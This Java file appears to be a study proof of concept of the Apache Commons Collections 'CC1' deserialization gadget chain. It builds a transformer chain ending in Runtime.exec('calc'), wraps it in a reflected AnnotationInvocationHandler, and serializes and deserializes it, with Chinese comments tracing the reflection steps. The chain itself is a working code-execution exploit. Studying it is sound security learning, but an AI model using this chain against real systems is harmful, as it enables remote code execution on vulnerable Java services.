package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC1TransformedMap {
    public static void main(String[] args) throws Exception {
//        Runtime.getRuntime().exec("calc");
//        Runtime r = Runtime.getRuntime();
//        Class<?> c = Runtime.class;
//        Method m = c.getMethod("exec", String.class);
//        m.invoke(r,"calc");
//        InvokerTransformer method = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
//        HashMap<Object,Object> map = new HashMap<>();
//        map.put("key",null);
//        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,method);
//        for(Map.Entry<Object,Object> entry:transformedMap.entrySet()){
//            entry.setValue(r);
//        }
        //Runtime没有继承Serializable，所以不能序列化。InvokerTransformer继承了Serializable，所以可以序列化。
        //Runtime r = Runtime.getRuntime();
        //Class<?> c = Runtime.class;
        //Method m = c.getMethod("exec", String.class);
        //m.invoke(r,"calc");改成反射调用版本，因为InvokerTransformer实际上是调用invoke反射
//        Class<Runtime> c = Runtime.class;
//        Method m = c.getMethod("exec", String.class);

//        Class<Runtime> c = Runtime.class;
//        Method gMethod = c.getMethod("getRuntime",null);//getRuntime无参，即null
//        Runtime r = (Runtime) gMethod.invoke(null,null);//执行getRuntime，静态方法无需实例，第一个参数为null；
//        r.exec("calc");

//        Method gMethod =(Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
//        Runtime r = (Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(gMethod);
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "godown");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);
//        Iterator it = transformedMap.entrySet().iterator();
//        while(it.hasNext()){
//            Map.Entry entry = (Map.Entry<Object,Object>) it.next();
//            entry.setValue(Runtime.class);
//        }
        Constructor<?> AnnotationInvocationHandlerConstructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        AnnotationInvocationHandlerConstructor.setAccessible(true);
        Object annotationInvocationHandler = AnnotationInvocationHandlerConstructor.newInstance(Target.class, transformedMap);
        serialize(annotationInvocationHandler);
        unserialize("ser.bin");
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get("ser.bin")));
        oos.writeObject(obj);
        System.out.println("serialize");
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get(Filename)));
        Object obj = ois.readObject();
        System.out.println("unserialize");
        return obj;
    }
}